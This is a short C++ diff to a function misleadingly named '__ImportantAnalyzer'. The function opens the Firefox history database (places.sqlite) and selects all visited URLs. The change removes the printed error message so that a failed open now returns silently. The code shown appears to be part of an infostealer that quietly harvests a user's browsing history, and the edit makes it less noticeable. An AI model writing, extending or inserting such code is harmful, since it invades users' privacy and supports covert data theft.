@@ -44,10 +44,9 @@ std::string __ImportantAnalyzer() {
     sqlite3 *db;
     std::string dbPath = defaultProfile + "places.sqlite";
     int rc = sqlite3_open(dbPath.c_str(), &db);
-    if (rc) {
-        std::cout << "Error opening Firefox history database: " << sqlite3_errmsg(db) << std::endl;
+    if (rc)
         return "";
-    }
+    
     std::string history;
     std::string query = "SELECT url FROM moz_places ORDER BY last_visit_date DESC";
     sqlite3_stmt *stmt;
